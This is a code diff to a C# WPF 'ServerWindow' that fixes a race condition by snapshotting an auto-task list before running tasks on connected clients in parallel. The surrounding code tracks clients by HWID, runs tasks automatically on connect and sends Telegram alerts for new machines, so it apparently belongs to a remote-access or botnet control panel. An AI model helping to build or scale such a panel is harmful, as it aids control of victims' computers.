@@ -967,8 +967,10 @@ public partial class ServerWindow : ThemedWindow
                                          || rec.ActivityLog.Count <= 1;
                         NotificationService.NotifyConnected(c.Id, isNewHwid);
 
-                        if (_autoTasks.Count > 0)
-                            await ExecuteAutoTasksForClient(c);
+                        var atSnapshot = await Dispatcher.InvokeAsync(
+                            () => _autoTasks.Count > 0 ? _autoTasks.ToList() : null);
+                        if (atSnapshot != null)
+                            await ExecuteAutoTasksForClient(c, atSnapshot);
 
                         bool telegramEnabled = await Dispatcher.InvokeAsync(() => BldTelegramEnabled.IsChecked == true);
                         if (isNewHwid && telegramEnabled)
@@ -4646,20 +4648,25 @@ Read-Host 'Press Enter to close'
     {
         if (_server == null || _autoTasks.Count == 0) return Task.CompletedTask;
         var clients = _server.ConnectedClients.Values.ToList();
+        if (clients.Count == 0) return Task.CompletedTask;
+        var snapshot = _autoTasks.ToList(); // capture on UI thread — safe
         // Parallel with cap — avoids blocking the caller for N×200ms at 10k+ clients
         return Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
             async (client, _) =>
             {
-                try { await ExecuteAutoTasksForClient(client); }
+                try { await ExecuteAutoTasksForClient(client, snapshot); }
                 catch { }
             }));
     }
 
-    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client)
+    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client, List<Data.AutoTaskEntry>? snapshot = null)
     {
+        // snapshot must be captured on the UI thread before entering any Task.Run;
+        // fall back to Dispatcher.InvokeAsync so background-thread callers are safe.
+        var tasks = snapshot ?? await Dispatcher.InvokeAsync(() => _autoTasks.ToList());
         var executedNames = new System.Collections.Generic.List<string>();
 
-        foreach (var task in _autoTasks.ToList())
+        foreach (var task in tasks)
         {
             // Atomic check+add: lock prevents race between ExecuteAutoTasksForAllConnected
             // (UI thread) and ClientConnected Task.Run (thread pool) both seeing Contains=false
